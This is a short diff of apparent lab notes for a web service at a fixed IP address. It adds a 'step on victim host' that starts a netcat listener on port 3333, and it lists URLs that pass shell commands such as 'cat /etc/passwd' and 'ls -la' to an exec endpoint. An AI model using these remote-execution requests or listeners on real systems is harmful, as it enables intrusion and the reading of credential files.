@@ -1,11 +1,15 @@
-#cmd 
+** step on victim host 
+
+*** nc -k -l 3333 &
+
+*cmd 
 http://3.96.209.91:5000/cmd?exec=cat%20/etc/passwd
 http://3.96.209.91:5000/cmd?exec=ls+-la
 
-#greeting
+*greeting
 http://3.96.209.91:5000/greet
 
-#client-ip
+*client-ip
 http://3.96.209.91:5000/client-ip
 
 From anywhere
